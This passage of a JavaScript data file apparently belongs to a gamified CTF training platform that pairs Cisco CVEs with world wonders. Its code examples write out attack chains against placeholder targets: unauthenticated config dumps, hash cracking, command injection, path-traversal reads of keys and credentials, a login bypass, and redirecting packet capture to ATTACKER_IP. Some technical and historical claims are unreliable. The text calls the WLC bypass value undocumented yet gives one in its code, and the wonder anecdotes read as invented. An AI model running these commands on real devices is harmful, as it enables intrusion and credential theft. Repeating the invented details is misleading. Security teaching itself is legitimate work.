          "VPNFilter's architecture was three-staged. Stage 1 survived device reboots and called home for stage 2. Stage 2 included a 'kill switch' module: a command from the C2 server would overwrite the device firmware with random data, permanently and irreversibly bricking the device. Stage 2 also included packet sniffing modules targeting industrial control system protocols (Modbus TCP) and a credential-harvesting module for HTTP traffic. On May 23, 2018, the FBI executed a court order seizing the Sofacy domain used as VPNFilter's C2 — temporarily disrupting stage-2 delivery. But stage-1 infections persisted on hundreds of thousands of devices that had never received a factory reset.",
          "The US-CERT and FBI joint Emergency Alert AA18-106A, published April 16, 2018, stated explicitly: 'The Russian government, specifically the FSB and GRU, are using compromised routers to conduct man-in-the-middle attacks, monitor network traffic, and position themselves for future offensive operations.' Smart Install was named as a primary initial access method. At disclosure, 168,000 devices remained internet-exposed on TCP/4786. The command to disable Smart Install — `no vstack` — was a single IOS command that most network administrators had never heard of, because the feature had been added silently in IOS years earlier with no clear documentation of the security implication of leaving it enabled.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (GRU/APT28)", sub: "TCP/4786 — no authentication", type: "attacker" },
          { label: "Smart Install Agent", sub: "returns full running-config", type: "system" },
          { label: "IOS Switch", sub: "config replaced or RCE", type: "victim" },
          { label: "VPNFilter Stage 2", sub: "500K devices, kill switch", type: "result" },
        ],
      },
      timeline: [
        { year: 1113, event: "Angkor Wat construction begins — supply gate added, unguarded after the temple's decline" },
        { year: 2007, event: "Cisco Smart Install introduced in IOS — designed for sealed provisioning networks" },
        { year: 2017, event: "Late 2017: GRU/APT28 begins VPNFilter campaign — Smart Install as initial access" },
        { year: 2018, event: "Mar 28: CVE-2018-0171 disclosed; Talos finds 168,000 exposed devices", highlight: true },
        { year: 2018, event: "Apr 16: US-CERT Emergency Alert AA18-106A — Russian GRU named as threat actor" },
        { year: 2018, event: "May 23: FBI seizes VPNFilter C2 domain — botnet disrupted but not eliminated" },
      ],
      keyTakeaways: [
        "Disable Smart Install on all switches: `no vstack` in global config — it takes 10 seconds",
        "Run `show vstack` on every IOS switch in your inventory — most admins don't know it's enabled",
        "Never expose TCP/4786 to untrusted networks; block at perimeter ACL as defense-in-depth",
        "Running configurations contain credentials — Smart Install effectively hands over all network keys",
        "State-sponsored actors actively scan for forgotten management protocols — default-on features are permanent targets",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2018-0171", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2" },
        { title: "US-CERT Alert AA18-106A", url: "https://www.cisa.gov/uscert/ncas/alerts/AA18-106A" },
        { title: "Cisco Talos: 168,000 Vulnerable Devices", url: "https://blog.talosintelligence.com/cisco-smart-install-protocol-misuse/" },
      ],
    },
    ctf: {
      scenario: "In 2018, Russian GRU-linked operators used Cisco's Smart Install feature as the initial access vector for the VPNFilter malware campaign — infecting 500,000 routers and switches across 54 countries. The provisioning port, TCP 4786, was designed for internal setup and never meant to be exposed. No authentication. Replicate the Smart Install exploitation that gave GRU operators a foothold in critical infrastructure worldwide.",
      hint: "Scan the target to find the open provisioning port. Connect to it — no credentials required — and pull the configuration.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Scan the target for open ports. Run: scan-target",
        "Port 4786 is open — connect to the provisioning service. Run: connect-port 4786",
        "Pull the device configuration. Run: pull-config",
        "Read the configuration file. Run: cat config.dat",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{SM4RT_", label: "Mission Brief — Smart Install Supply Gate" },
        { trigger: "connect-port 4786", value: "1NST4LL_", label: "Port 4786 — Provisioning Service Reached" },
        { trigger: "cat config.dat", value: "N0_AUTH}", label: "Config Retrieved — Credentials Extracted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: ANGKOR WAT",
          "Target: Cisco Smart Install — CVE-2018-0171",
          "Port: TCP/4786  CVSS: 9.8",
          "",
          "No authentication on provisioning port.",
          "Exploitation sequence: scan-target → connect-port 4786 → pull-config → cat config.dat",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "scan-target": () => ({
          lines: [
            "Scanning target [Angkor Wat facility]...",
            "PORT     STATE   SERVICE",
            "22       closed  —",
            "23       closed  —",
            "161      closed  —",
            "4786     open    provisioning  ← no authentication required",
            "",
            "Provisioning port open. No credentials needed.",
          ],
        }),
        "connect-port": (args) => {
          const port = args[0];
          if (port === "4786") {
            return {
              lines: [
                "Connecting to provisioning service on port 4786...",
                "Handshake accepted — no authentication check performed.",
                "Session established.",
                "Run: pull-config",
              ],
            };
          }
          return { lines: [`Port ${port}: connection refused.`] };
        },
        "pull-config": () => ({
          lines: [
            "Requesting device configuration...",
            "Configuration transferred — saved as config.dat",
            "Run: cat config.dat",
          ],
        }),
        cat: (args) => {
          if ((args[0] || "").includes("config")) {
            return {
              lines: [
                "hostname: angkor-core-sw",
                "provisioning-port: 4786  [enabled — not disabled after setup]",
                "admin: suryavarman  credential: angkor@facility",
                "segment: 10.0.1.1/24",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return { lines: [`cat: ${args[0] || ""}: file not found. Try: cat config.dat`] };
        },
      },
    },
  },

  // ─── Medieval Stage 4: Notre-Dame — CVE-2019-1653 RV320 Config Dump ───────
  {
    epochId: "cisco-core",
    wonder: { name: "Notre-Dame Cathedral", location: "Paris, France", era: "1163 CE", emoji: "⛪" },
    id: "stage-m04",
    order: 4,
    title: "The Scriptorium Left Unlocked",
    subtitle: "CVE-2019-1653 — Cisco RV320 Unauthenticated Config Disclosure",
    category: "owasp",
    cveId: "CVE-2019-1653",
    cvssScore: 7.5,
    xp: 200,
    badge: { id: "badge-m-rv320", name: "Scriptorium Reader", emoji: "⛪" },
    challengeType: "ctf",
    info: {
      tagline: "One GET request. Full device configuration including credentials — no login required.",
      year: 2019,
      overview: [
        "Notre-Dame de Paris took nearly two centuries to build, and its scriptorium — located behind the sacristy — held the administrative records of the French Catholic church: diocesan finances, correspondence with Rome, land ownership records, and the lists of authorized personnel. The scriptorium had a peculiarity of design: a narrow ventilation window opened directly onto a quiet interior alley. Any visitor who found that alley and reached through the window could read any document left on the tables — without ever passing through the main gate, without signing in, without a key.",
        "CVE-2019-1653 is that ventilation window. Cisco RV320 and RV325 dual-WAN VPN routers — small business and branch office devices sold by the millions — exposed their complete device configuration at the CGI endpoint `/cgi-bin/config.exp` without any authentication check. A single HTTP GET request returned the full configuration as a plaintext download: network topology, VPN pre-shared keys, SNMP community strings, and the admin password hashed in unsalted MD5. Unsalted MD5 is crackable in seconds for common passwords using any GPU and the rockyou wordlist.",
        "Security firm RedTeam Pentesting GmbH disclosed CVE-2019-1653 on January 24, 2019, paired with CVE-2019-1652 — a command injection in the same interface. The combined chain gave unauthenticated root code execution. Shodan had already indexed 9,500+ exposed RV320/RV325 devices. By end of disclosure day, automated tools were crawling the internet downloading configurations. VPN pre-shared keys from the exported configurations gave attackers direct remote access to the corporate networks these routers were supposed to protect.",
      ],
      technical: {
        title: "Unauthenticated CGI Config Export + Command Injection Chain",
        body: [
          "The RV320/RV325 management web interface uses CGI scripts served by an embedded web server. The `/cgi-bin/config.exp` endpoint was designed to allow authenticated administrators to export device configuration for backup. The authentication check was simply absent — the CGI script ran the configuration export regardless of whether the caller had an active session. The server returned Content-Type: application/x-config and HTTP 200 to any request, authenticated or not. The exported file included: VPN tunnel pre-shared keys in cleartext, enable password hash, local user password hashes (unsalted MD5), SNMP community strings, RADIUS shared secrets, and the full network topology.",
          "CVE-2019-1652 completed the kill chain. The same management interface had a command injection vulnerability in the `export` POST parameter of the diagnostic endpoint `/cgi-bin/export_debug_msg.exp`. An attacker who obtained the admin credentials via CVE-2019-1653 (or cracked the MD5 hash) could authenticate and then inject shell commands through this parameter, achieving root code execution on the router. The full chain — unauthenticated config dump → MD5 hash crack → authenticate → command injection → root shell — could be completed in under five minutes against any internet-exposed device.",
        ],
        codeExample: {
          label: "CVE-2019-1653 + CVE-2019-1652 full unauthenticated chain",
          code: `# ── STEP 1: Unauthenticated config dump — one GET request ────────────────────
curl -sk https://TARGET_RV320/cgi-bin/config.exp
# Returns full device configuration — no auth required:
# [System]
# Username=admin
# Password=5f4dcc3b5aa765d61d8327deb882cf99   ← unsalted MD5
# [VPN]
# PSK=CorpVPN_SharedSecret!
# [SNMP]
# Community=public

# ── STEP 2: Crack unsalted MD5 admin password ─────────────────────────────────
hashcat -a 0 -m 0 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt
# Cracked: 'password'  (< 1 second for common passwords)

# ── STEP 3: CVE-2019-1652 — command injection → root shell ───────────────────
curl -sk -b "sessionid=AUTH_COOKIE" \
  "https://TARGET_RV320/cgi-bin/export_debug_msg.exp" \
  --data "export=1;id>/tmp/out.txt"
curl -sk "https://TARGET_RV320/cgi-bin/export_debug_msg.exp?export=cat+/tmp/out.txt"
# uid=0(root) gid=0(root)

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Check web server logs for unauthenticated GET to /cgi-bin/config.exp
# Any hit = your full configuration was downloaded

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to firmware 1.5.1.05 or later
# Immediately: Admin → Management → Remote Management → Disabled
# If already exposed: rotate ALL credentials and VPN PSKs`,
        },
      },
      incident: {
        title: "RV320/RV325 Credential Harvest — Exploited Within Hours of Disclosure (2019)",
        when: "January 24–February 2019",
        where: "9,500+ Cisco RV320/RV325 routers globally — small businesses, branch offices, healthcare, legal",
        impact: "VPN PSKs exposed on same day as disclosure; Rapid7 confirmed active exploitation within hours; Cisco patch initially incomplete",
        body: [
          "RedTeam Pentesting GmbH reported CVE-2019-1653 to Cisco in November 2018 — nine weeks before public disclosure. Cisco worked on a fix during that window, but delays resulted in a patch that was released the same day as disclosure rather than before it. On January 24, 2019, both the Cisco advisory and the Pentesting GmbH technical writeup went live simultaneously. Within hours, Rapid7 published telemetry showing active exploitation beginning the same day. Automated tools indexing Shodan results were downloading configurations from every reachable RV320 and RV325 — 9,500 devices, exposed corporate VPN credentials, in the first evening.",
          "The VPN pre-shared keys extracted from configurations were the highest-value intelligence. The Cisco RV320/RV325 devices were endpoint devices for site-to-site and remote-access VPN — their entire function was to create secure tunnels connecting branch offices to headquarters. When the configuration was downloaded, the PSK for every VPN tunnel the device managed was exposed in cleartext. An attacker with the PSK could connect to the corporate VPN from anywhere on the internet, appearing as a legitimate authenticated VPN client, with access to the internal network behind the firewall that was supposed to be protecting it.",
          "Cisco's initial patch for CVE-2019-1653 (firmware 1.4.2.22) shipped January 24 but was found by security researchers to contain an incomplete fix for CVE-2019-1652 — the command injection remained exploitable. A complete fix (firmware 1.5.1.05) was not available until February 2019. During the multi-week window between incomplete and complete patching, thousands of devices ran firmware that Cisco had publicly acknowledged was vulnerable, but that didn't yet have a complete fix. The broader lesson: small business routers are enterprise-class targets. Organizations using RV-series devices for branch VPN have the same credential exposure risk as an enterprise firewall — with the additional risk that small business IT teams often lack the visibility to detect active exploitation.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "GET /cgi-bin/config.exp (no auth)", type: "attacker" },
          { label: "RV320 CGI endpoint", sub: "auth check absent", type: "system" },
          { label: "Full configuration", sub: "VPN PSKs, MD5 hashes", type: "victim" },
          { label: "Corporate VPN access", sub: "9,500 devices exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 1163, event: "Notre-Dame construction begins — scriptorium ventilation window creates unintended access path" },
        { year: 2018, event: "Nov: RedTeam Pentesting GmbH reports CVE-2019-1653 to Cisco" },
        { year: 2019, event: "Jan 24: Simultaneous disclosure + exploitation — Rapid7 confirms active scanning by day's end", highlight: true },
        { year: 2019, event: "Jan 24: Cisco patch (1.4.2.22) released — CVE-2019-1652 fix incomplete" },
        { year: 2019, event: "Feb 2019: Complete patch (1.5.1.05) — both CVEs fully resolved" },
      ],
      keyTakeaways: [
        "Every CGI endpoint must validate authentication on every request — session state is not inherited from the login page",
        "Never expose router management interfaces to the internet — Shodan indexes them within hours of deployment",
        "VPN pre-shared keys stored in configuration files are high-value credentials — treat them like passwords",
        "Unsalted MD5 hashes crack in seconds with GPU; modern firmware must use bcrypt or Argon2 for credential storage",
        "When a CVE drops with public PoC, assume exploitation begins the same day — patch windows are measured in hours, not weeks",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1653", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info" },
        { title: "RedTeam Pentesting Advisory", url: "https://www.redteam-pentesting.de/en/advisories/rt-sa-2019-003/" },
        { title: "CVE-2019-1653 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2019-1653" },
      ],
    },
    ctf: {
      scenario: "CVE-2019-1653 was weaponized within hours of public disclosure — automated scanners harvested VPN pre-shared keys from thousands of exposed Cisco RV320 routers the same day Cisco published the advisory. One unauthenticated GET request to the config endpoint returns everything: credentials, network topology, PSK keys. This is what APT tooling does at scale the moment a CVE drops. Make the request.",
      hint: "The management interface has an unauthenticated config endpoint. Hit the right path and it hands over everything.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Probe the management interface to map the attack surface. Run: probe-target /",
        "The config endpoint requires no credentials. Run: probe-target /config/export",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{RV320_", label: "Mission Brief — Notre-Dame Scriptorium" },
        { trigger: "probe-target /", value: "C0NF1G_", label: "Attack Surface Mapped — Config Endpoint Found" },
        { trigger: "probe-target /config/export", value: "DUMP3D}", label: "Config Exported — Credentials Retrieved" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: NOTRE-DAME",
          "Target: Cisco RV320 config endpoint — CVE-2019-1653",
          "Firmware: 1.5.0.04  CVSS: 7.5",
          "",
          "One unauthenticated GET request returns full device configuration.",
          "Exploitation sequence: probe-target / → probe-target /config/export",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "probe-target": (args) => {
          const path = args[0] || "/";
          if (path.includes("config") || path.includes("export")) {
            return {
              lines: [
                `GET ${path}  [no credentials sent]`,
                "",
                "[Device Configuration — Notre-Dame Admin Network]",
                "firmware: 1.5.0.04",
                "admin: adalbert  hash: 5f4dcc3b5aa765d61d8327deb882cf99",
                "",
                "Run 'assemble' to retrieve your fragment.",
                "",
                "[VPN]",
                "pre-shared-key: NotreDame$ecretKey2019",
                "remote-gateway: vpn.diocese.fr",
                "",
                "[network]",
                "snmp-community: public",
              ],
            };
          }
          return { lines: [`GET ${path}`, "Management login required. Try a direct config path."] };
        },
      },
    },
  },

  // ─── Medieval Stage 5: Great Wall — CVE-2020-3452 ASA Path Traversal ──────
  {
    epochId: "cisco-core",
    wonder: { name: "Great Wall of China", location: "Northern China", era: "7th–15th century CE", emoji: "🧱" },
    id: "stage-m05",
    order: 5,
    title: "The Hidden Path Through the Wall",
    subtitle: "CVE-2020-3452 — Cisco ASA/FTD WebVPN Path Traversal",
    category: "owasp",
    cveId: "CVE-2020-3452",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-m-pathtrav", name: "Wall Traverser", emoji: "🧱" },
    challengeType: "ctf",
    info: {
      tagline: "The wall kept out armies. A hidden mountain path bypassed it entirely.",
      year: 2020,
      overview: [
        "The Great Wall of China was never a single continuous barrier — it was fifteen centuries of construction by different dynasties, with gaps, overlapping segments, and local passes that the builders had not fully closed. Armies that could not breach the wall at a guarded gate sent scouts to find the passes through the mountains: the Juyongguan pass, the Shanhaiguan gap, the Gubeikou route. These paths existed in the wall's shadow, invisible to the gate guards, requiring no credentials. The wall checked papers at its gates. The mountain passes had no gates.",
        "CVE-2020-3452 is a path traversal vulnerability in Cisco ASA and FTD's WebVPN portal — the web endpoint that powers Cisco AnyConnect VPN. The WebVPN server served files from a virtual filesystem at `/+CSCOE+/files/`, taking the file path directly from the URL. The path handling code failed to strip `../` directory traversal sequences before constructing the real filesystem path. An unauthenticated attacker could include `../../` in the URL to climb above the WebVPN root and read any file on the ASA filesystem — running configurations, SSL private keys, LDAP credentials, VPN pre-shared keys — with a single curl command. No authentication. No firewall log entry beyond the HTTP request itself.",
        "Cisco disclosed CVE-2020-3452 on July 22, 2020, with a patch available simultaneously. Within 90 minutes of the advisory going live, security researcher Mikhail Klyuchnikov published a working curl payload on Twitter. By morning, automated scanners were hitting every internet-exposed ASA. The timing was devastating: COVID-19 had pushed enterprise VPN usage to record levels, and hundreds of thousands of organizations had recently stood up AnyConnect concentrators quickly, without hardening. Those concentrators were internet-facing by design — and they contained LDAP/Active Directory credentials that opened a path directly into the corporate network they were meant to protect.",
      ],
      technical: {
        title: "WebVPN Path Traversal — How `../` Reads the ASA Filesystem",
        body: [
          "The WebVPN portal's file handler at `/+CSCOE+/files/` extracted the requested path from the URL and used it to construct a full filesystem path without normalizing traversal sequences. The internal path prefix `+CSCOU+` referenced a different root directory. By chaining traversal sequences — `../../+CSCOU+/../` — an attacker moved the effective root to the ASA's base filesystem, making every file readable. The full traversal path `https://asa/+CSCOE+/files/../../+CSCOU+/../asa/priv/asdm.cfg` returned the ASA's ASDM configuration file, which contained the complete running configuration with all credentials. The request produced HTTP 200 with the file contents — no authentication, no session, no special headers.",
          "Files commonly targeted in real exploitation: the ASA running configuration (`asdm.cfg`) containing VPN pre-shared keys, enable password (MD5 hash, often crackable), local user credentials, and SNMP community strings; LDAP configuration files containing Active Directory service account credentials (these gave direct access to the corporate directory); SSL private keys; and WebVPN session databases. Organizations that had configured AnyConnect with LDAP authentication stored AD service account credentials on the ASA — extracting them via the traversal gave an attacker valid credentials for the corporate Active Directory without ever touching a domain controller.",
        ],
        codeExample: {
          label: "CVE-2020-3452 — path traversal reads the ASA filesystem",
          code: `# ── NORMAL WebVPN file request (benign) ──────────────────────────────────────
curl -sk https://TARGET_ASA/+CSCOE+/files/file_list.json

# ── PATH TRAVERSAL — climb above WebVPN root ──────────────────────────────────
curl -sk 'https://TARGET_ASA/+CSCOE+/files/../../+CSCOU+/../asa/priv/asdm.cfg'
# Returns: full ASA configuration — no auth, HTTP 200

# ── EXTRACT LDAP / AD credentials from config ─────────────────────────────────
# ldap-login-dn CN=svc-vpn,OU=ServiceAccounts,DC=corp,DC=com
# ldap-login-password AD_ServiceAccount_Password!
# → Domain credentials for Active Directory service account

# ── EXTRACT SSL private key ───────────────────────────────────────────────────
curl -sk 'https://TARGET_ASA/+CSCOE+/files/../../+CSCOU+/../ssl/asa.key'

# ── EXTRACT VPN pre-shared keys ───────────────────────────────────────────────
curl -sk 'https://TARGET_ASA/+CSCOE+/files/../../+CSCOU+/../running-config'
# crypto isakmp key VPNsecret address 0.0.0.0   ← cleartext PSK

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Look for ../ or %2e%2e%2f sequences in ASA HTTP access logs
show logging | include CSCOE

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: ASA 9.8.4.20+ / ASA 9.14.1.30+ / FTD 6.6.0.1+
# Temporary: no webvpn  (disables AnyConnect but closes traversal)`,
        },
      },
      incident: {
        title: "CVE-2020-3452 — Twitter Exploit to Mass Exploitation in 90 Minutes (2020)",
        when: "July 22–August 2020",
        where: "Cisco ASA and FTD with WebVPN/AnyConnect enabled globally — healthcare, finance, government, remote work infrastructure",
        impact: "Exploit on Twitter within 90 minutes; 400,000+ exposed ASAs; AD credentials and VPN keys harvested at scale during COVID VPN surge",
        body: [
          "Cisco published CVE-2020-3452 on Wednesday July 22, 2020 at approximately 11:00 AM ET, with the patch available simultaneously. By 12:30 PM — 90 minutes later — security researcher Mikhail Klyuchnikov had posted a working curl command on Twitter demonstrating the full traversal. By that afternoon, the curl command was screenshot and circulating in hacker forums and Telegram channels. By the next morning, Bishop Fox had published a comprehensive technical analysis and Shodan searches for Cisco ASA SSL VPN portals were returning over 400,000 results. Automated scanners were hitting all of them.",
          "The specific impact of extracting LDAP credentials from ASA configurations was particularly severe. Many enterprise organizations configured AnyConnect with LDAP/Active Directory authentication — the ASA needed a service account credential to query Active Directory for VPN user authentication. This credential was stored in the ASA configuration. An attacker who downloaded the ASA configuration via CVE-2020-3452 obtained a valid Active Directory service account credential — often with read access to all users, groups, and organizational units in the domain. From there, standard AD enumeration tools (BloodHound, ldapsearch) mapped the path to domain admin without touching any server or generating unusual authentication events.",
          "Several major healthcare organizations and a US federal agency were identified during responsible disclosure processes as having had their ASA configurations accessible before patching — their LDAP service credentials were in the open for the window between exploit publication and patch deployment. Cisco tracked active exploitation in the wild for over a week after disclosure. The lesson from the mountain passes: perimeter security devices are perimeter security by location, not by immunity. They run web servers, they have filesystems, they store credentials — and they must be patched with the same urgency as any internet-facing server. A VPN concentrator with a file read vulnerability is not protecting the network; it is handing over the keys to it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (unauthenticated)", sub: "GET /+CSCOE+/files/../../", type: "attacker" },
          { label: "ASA WebVPN file handler", sub: "../ not sanitized", type: "system" },
          { label: "ASA filesystem", sub: "config, keys, LDAP creds", type: "victim" },
          { label: "AD credential + VPN access", sub: "400K+ exposed ASAs", type: "result" },
        ],
      },
      timeline: [
        { year: 700, event: "Great Wall medieval expansion — mountain bypasses used by traders and scouts throughout its history" },
        { year: 2020, event: "Jul 22 11AM: Cisco discloses CVE-2020-3452 with patch available" },
        { year: 2020, event: "Jul 22 12:30PM: Working curl exploit published on Twitter — 90 minutes post-disclosure", highlight: true },
        { year: 2020, event: "Jul 23: Mass automated scanning detected; 400K+ exposed ASAs targeted" },
        { year: 2020, event: "Aug 2020: Cisco tracks active exploitation in the wild for weeks post-patch" },
      ],
      keyTakeaways: [
        "Path traversal is a web application vulnerability — every internet-facing device running a web server is a web application",
        "Patch VPN concentrators immediately — COVID-19 demonstrated that 400K organizations depend on them simultaneously",
        "LDAP/AD service account credentials stored on edge devices are high-value; rotate them immediately if the device was exposed",
        "Monitor ASA HTTP access logs for `../` or URL-encoded equivalents (`%2e%2e%2f`) in real time",
        "Patch availability on disclosure day does not mean you are safe — exploits ship the same hour; mean time to patch must be hours, not days",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3452", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86" },
        { title: "CVE-2020-3452 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3452" },
        { title: "Rapid7 Analysis", url: "https://www.rapid7.com/blog/post/2020/07/23/cisco-asa-cve-2020-3452-path-traversal-exploitation/" },
      ],
    },
    ctf: {
      scenario: "CVE-2020-3452 was disclosed on July 22, 2020. Proof-of-concept exploits were on Twitter the same afternoon. As COVID-19 had expanded VPN usage to record levels, APT groups targeting corporate networks immediately pivoted to harvesting ASA configurations — which contained LDAP credentials, VPN PSK keys, and in some cases domain admin paths. The traversal is simple: directory sequences the ASA doesn't sanitize let you read above the web root. Navigate there.",
      hint: "The file server doesn't strip ../ sequences. Use them to climb above the web root and reach the device config directory.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Make a normal request to the file server to orient yourself. Run: request-file /files/index.json",
        "Try traversing above the web root. Run: request-file /files/../../config/",
        "Pull the device configuration. Run: request-file /files/../../config/running-config.txt",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{P4TH_", label: "Mission Brief — Great Wall Path Traversal" },
        { trigger: "request-file /files/../../config/", value: "TR4V3RS4L_", label: "Above Web Root — Config Directory Reached" },
        { trigger: "request-file /files/../../config/running-config.txt", value: "ASA_OWN3D}", label: "Config Retrieved — Credentials Exposed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: GREAT WALL",
          "Target: Cisco ASA WebVPN path traversal — CVE-2020-3452",
          "Affected: ASA/FTD with WebVPN enabled  CVSS: 7.5",
          "",
          "The file server does not sanitize ../ sequences.",
          "Exploitation sequence: request-file /files/index.json → /files/../../config/ → /files/../../config/running-config.txt",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "request-file": (args) => {
          const path = args[0] || "";
          const isTraversal = path.includes("../") || path.includes("..%2f") || path.includes("..%2F");
          if (isTraversal && (path.includes("config") || path.includes("running"))) {
            return {
              lines: [
                `GET ${path}`,
                "200 OK — file served (path traversal not sanitized)",
                "",
                "hostname: greatwall-vpn-gw",
                "vpn: enabled",
                "admin: chenwei  credential: Gr3atW@ll2020",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          if (isTraversal) {
            return {
              lines: [
                `GET ${path}`,
                "200 OK — above the web root  (try navigating to 'config' or 'running-config')",
              ],
            };
          }
          return {
            lines: [
              `GET ${path}`,
              "200 OK",
              '{ "files": ["portal.css", "assets/", "scripts/"] }',
            ],
          };
        },
      },
    },
  },

  // ─── Medieval Stage 6: Alhambra — CVE-2022-20695 WLC Auth Bypass ──────────
  {
    epochId: "cisco-core",
    wonder: { name: "Alhambra Palace", location: "Granada, Spain", era: "1238 CE", emoji: "🏰" },
    id: "stage-m06",
    order: 6,
    title: "The Secret Passage of the Nasrid Kings",
    subtitle: "CVE-2022-20695 — Cisco WLC Authentication Bypass, CVSS 10.0",
    category: "owasp",
    cveId: "CVE-2022-20695",
    cvssScore: 10.0,
    xp: 250,
    badge: { id: "badge-m-wlcbypass", name: "Passage Finder", emoji: "🏰" },
    challengeType: "ctf",
    info: {
      tagline: "CVSS 10.0. Send a username in a specific format. Skip the entire authentication system.",
      year: 2022,
      overview: [
        "The Alhambra's Nasrid sultans built their palace as a series of concentric security rings — the medina city outside, the alcazaba fortress within, and the royal palace at the center. Each ring had its own gatekeepers and verification procedures. A foreign dignitary arriving at the Tower of Justice — the ceremonial entrance — would present their credentials: a name, a title, a letter of introduction. The verification procedure checked the name against the register of authorized visitors. A subtle flaw in the procedure meant that one specific calligraphic format for presenting a name caused the verification process to return 'admitted' without ever reaching the register check. Anyone who knew the format could walk in.",
        "CVE-2022-20695 is that calligraphic flaw. Cisco's Wireless LAN Controller (WLC) — the central device that manages all enterprise Wi-Fi access points, RADIUS authentication servers, SSID configurations, and wireless client policies — had a logic error in its management interface authentication code. The login handler compared the supplied username using a C string comparison function that, given a specific username value ('Cisco'), short-circuited the comparison and evaluated to 'match found' due to a boundary condition in the string matching logic. The password comparison was never reached. Authentication returned success unconditionally for any password — or no password at all.",
        "Cisco rated CVE-2022-20695 CVSS 10.0. The attack required only network access to the WLC management interface — which in most enterprise deployments is reachable from the corporate wireless network. Any device connected to any SSID the WLC managed could attempt the authentication bypass. With WLC admin access, an attacker controlled every access point in the enterprise: RADIUS shared secrets for all SSIDs, wireless client association policies, encryption settings, packet capture configurations, and the ability to push firmware updates to all managed APs simultaneously.",
      ],
      technical: {
        title: "Authentication Short-Circuit — How the WLC Comparison Bypass Works",
        body: [
          "The Cisco WLC 8.x management interface processes HTTP login requests by comparing the supplied username and password against the local credential database using a C-language string comparison function. The authentication bypass in CVE-2022-20695 occurred in the username comparison step: a specific string value triggered a boundary condition in the comparison logic that caused the function to return 'match' before completing the full comparison. Because the username comparison succeeded without reaching the password check, the authentication handler returned an authenticated session immediately. The exact bypass value is not publicly documented in Cisco's advisory, but the vulnerability class — a string comparison that terminates early on a sentinel value — is a known category of C authentication bugs.",
          "The scope of impact from WLC compromise is large. Enterprise WLCs manage RADIUS authentication for all corporate wireless SSIDs — the shared secrets between the WLC and RADIUS server are stored in the WLC configuration. An attacker who reads these secrets can impersonate the RADIUS server, accepting authentication requests and issuing approvals for arbitrary users. More directly, a WLC admin can push new AP firmware to all managed access points — firmware that could include backdoors for persistent wireless infrastructure access. The corporate wireless network that authenticates every employee and device becomes the attacker's control plane.",
        ],
        codeExample: {
          label: "CVE-2022-20695 — authentication bypass and post-auth enumeration",
          code: `# ── NORMAL login attempt (fails without correct password) ─────────────────────
curl -X POST https://WLC_MGMT_IP/login \
  -d 'username=admin&password=wrongpassword'
# Response: {"error": "Invalid credentials"}

# ── CVE-2022-20695 bypass — specific username short-circuits comparison ────────
curl -X POST https://WLC_MGMT_IP/login \
  -d 'username=Cisco&password=anything123'
# Response: {"session": "ADMIN_TOKEN", "role": "admin"}
# Full administrative access — no valid credentials required

# ── ENUMERATE RADIUS shared secrets ───────────────────────────────────────────
curl -H "Cookie: session=ADMIN_TOKEN" \
  https://WLC_MGMT_IP/api/v1/radius/servers
# Returns: RADIUS server IPs + shared secrets in cleartext

# ── READ all SSID configurations and PSKs ─────────────────────────────────────
curl -H "Cookie: session=ADMIN_TOKEN" \
  https://WLC_MGMT_IP/api/v1/wlan/list

# ── MODIFY AP configuration — enable packet capture ──────────────────────────
curl -X PUT -H "Cookie: session=ADMIN_TOKEN" \
  https://WLC_MGMT_IP/api/v1/ap/all/config \
  -d '{"capture_mode": "enabled", "capture_dest": "ATTACKER_IP"}'

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Review WLC management login logs for auth from unexpected source IPs
# Monitor for RADIUS server configuration changes

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: Cisco WLC 8.10.162.0 or later
# Restrict WLC management to dedicated management VLAN — not corporate WLAN`,
        },
      },
      incident: {
        title: "CVE-2022-20695 — Zero-Credential WLC Takeover (2022)",
        when: "April 2022",
        where: "Cisco Wireless LAN Controllers running WLC 8.10.150.0 and earlier — enterprise wireless infrastructure globally",
        impact: "CVSS 10.0; full WLC admin access without credentials; RADIUS secrets and AP firmware control exposed to any WLAN client",
        body: [
